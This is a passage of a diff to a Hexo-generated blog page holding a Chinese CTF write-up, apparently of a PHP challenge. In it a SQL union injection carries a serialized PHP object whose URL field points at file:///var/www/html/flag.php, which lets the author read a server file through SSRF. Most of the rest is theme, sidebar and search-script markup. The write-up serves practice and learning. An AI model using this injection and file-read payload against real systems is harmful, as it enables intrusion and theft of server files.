<span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看完有点懵逼，查询资料才知道是考ssrf漏洞</p>
+<p>利用SSRF漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=<span class="number">0</span>++union++select++<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/03/e6XaByfSor4wAG1.png"></p>
+<p>去看源码<br><img src="https://i.loli.net/2021/01/03/glVrRB6OeLi4jTf.png"></p>
+<blockquote>
+<p>得到flag！</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Glacier</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
   </nav>
 </div>
 
-        <div class="footer">
-  <div class="social">
-    <ul>
-      
-        <li>
-          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
-            <i class="iconfont icon-github"></i>
-          </a>
-        </li>
-      
-        <li>
-          <a title="email" href="">
-            <i class="iconfont icon-envelope"></i>
-          </a>
-        </li>
-      
-        <li>
-          <a title="facebook" href="">
-            <i class="iconfont icon-facebooksquare"></i>
-          </a>
-        </li>
-      
-        <li>
-          <a title="twitter" href="">
-            <i class="iconfont icon-twitter"></i>
-          </a>
-        </li>
-      
-        <li>
-          <a title="wechat" href="">
-            <i class="iconfont icon-wechat"></i>
-          </a>
-        </li>
-      
-        <li>
-          <a title="weibo" href="">
-            <i class="iconfont icon-weibo"></i>
-          </a>
-        </li>
-      
-        <li>
-          <a title="rss" href="/atom.xml">
-            <i class="iconfont icon-rss"></i>
-          </a>
-        </li>
-      
-    </ul>
-  </div>
-  
-    <div class="footer-more">
-      <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2020</a>
-    </div>
-  
-    <div class="footer-more">
-      <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
-    </div>
-  
-</div>
+
 
       </div>
 
-      <div class="back-to-top hidden">
-  <a href="javascript: void(0)">
-    <i class="iconfont icon-chevronup"></i>
-  </a>
-</div>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
 
 
-<script src="/js/backtotop.js"></script>
-
-
-
-      
-  <div class="search-icon" id="search-icon">
-    <a href="javascript: void(0)">
-      <i class="iconfont icon-search"></i>
-    </a>
-  </div>
-
-  <div class="search-overlay hidden">
-    <div class="search-content" tabindex="0">
-      <div class="search-title">
-        <span class="search-icon-input">
-          <a href="javascript: void(0)">
-            <i class="iconfont icon-search"></i>
-          </a>
-        </span>
-        
-          <input type="text" class="search-input" id="search-input" placeholder="Search...">
-        
-        <span class="search-close-icon" id="search-close-icon">
-          <a href="javascript: void(0)">
-            <i class="iconfont icon-close"></i>
-          </a>
-        </span>
       </div>
-      <div class="search-result" id="search-result"></div>
-    </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Glacier</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
   </div>
 
-  <script type="text/javascript">
-    var inputArea = document.querySelector("#search-input")
-    var searchOverlayArea = document.querySelector(".search-overlay")
-
-    inputArea.onclick = function() {
-      getSearchFile()
-      this.onclick = null
-    }
-
-    inputArea.onkeydown = function() {
-      if(event.keyCode == 13)
-        return false
-    }
-
-    function openOrHideSearchContent() {
-      let isHidden = searchOverlayArea.classList.contains('hidden')
-      if (isHidden) {
-        searchOverlayArea.classList.remove('hidden')
-        document.body.classList.add('hidden')
-        // inputArea.focus()
-      } else {
-        searchOverlayArea.classList.add('hidden')
-        document.body.classList.remove('hidden')
-      }
-    }
-
-    function blurSearchContent(e) {
-      if (e.target === searchOverlayArea) {
-        openOrHideSearchContent()
-      }
-    }
-
-    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
-    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
-    searchOverlayArea.addEventListener("click", blurSearchContent, false)
-
-    var searchFunc = function (path, search_id, content_id) {
-      'use strict';
-      var $input = document.getElementById(search_id);
-      var $resultContent = document.getElementById(content_id);
-      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
-      $.ajax({
-        // 0x01. load xml file
-        url: path,
-        dataType: "xml",
-        success: function (xmlResponse) {
-          // 0x02. parse xml file
-          var datas = $("entry", xmlResponse).map(function () {
-            return {
-              title: $("title", this).text(),
-              content: $("content", this).text(),
-              url: $("url", this).text()
-            };
-          }).get();
-          $resultContent.innerHTML = "";
-
-          $input.addEventListener('input', function () {
-            // 0x03. parse query to keywords list
-            var str = '<ul class=\"search-result-list\">';
-            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-            $resultContent.innerHTML = "";
-            if (this.value.trim().length <= 0) {
-              return;
-            }
-            // 0x04. perform local searching
-            datas.forEach(function (data) {
-              var isMatch = true;
-              var content_index = [];
-              if (!data.title || data.title.trim() === '') {
-                data.title = "Untitled";
-              }
-              var orig_data_title = data.title.trim();
-              var data_title = orig_data_title.toLowerCase();
-              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
-              var data_content = orig_data_content.toLowerCase();
-              var data_url = data.url;
-              var index_title = -1;
-              var index_content = -1;
-              var first_occur = -1;
-              // only match artiles with not empty contents
-              if (data_content !== '') {
-                keywords.forEach(function (keyword, i) {
-                  index_title = data_title.indexOf(keyword);
-                  index_content = data_content.indexOf(keyword);
-
-                  if (index_title < 0 && index_content < 0) {
-                    isMatch = false;
-                  } else {
-                    if (index_content < 0) {
-                      index_content = 0;
-                    }
-                    if (i == 0) {
-                      first_occur = index_content;
-                    }
-                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
-                  }
-                });
-              } else {
-                isMatch = false;
-              }
-              // 0x05. show search results
-              if (isMatch) {
-                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
-                var content = orig_data_content;
-                if (first_occur >= 0) {
-                  // cut out 100 characters
-                  var start = first_occur - 20;
-                  var end = first_occur + 80;
-
-                  if (start < 0) {
-                    start = 0;
-                  }
-
-                  if (start == 0) {
-                    end = 100;
-                  }
-
-                  if (end > content.length) {
-                    end = content.length;
-                  }
-
-                  var match_content = content.substr(start, end);
-
-                  // highlight all keywords
-                  keywords.forEach(function (keyword) {
-                    var regS = new RegExp(keyword, "gi");
-                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
-                  });
-
-                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
-                }
-                str += "</li>";
-              }
-            });
-            str += "</ul>";
-            if (str.indexOf('<li>') === -1) {
-              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
-            }
-            $resultContent.innerHTML = str;
-          });
-        },
-        error: function(xhr, status, error) {
-          $resultContent.innerHTML = ""
-          if (xhr.status === 404) {
-            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
-          } else {
-            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
-          }
-        }
-      });
-      $(document).on('click', '#search-close-icon', function() {
-        $('#search-input').val('');
-        $('#search-result').html('');
-      });
-    }
-
-    var getSearchFile = function() {
-        var path = "/search.xml";
-        searchFunc(path, 'search-input', 'search-result');
-    }
-  </script>
+        
 
 
 
 
-    </div>
-  </body>
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
 </html>
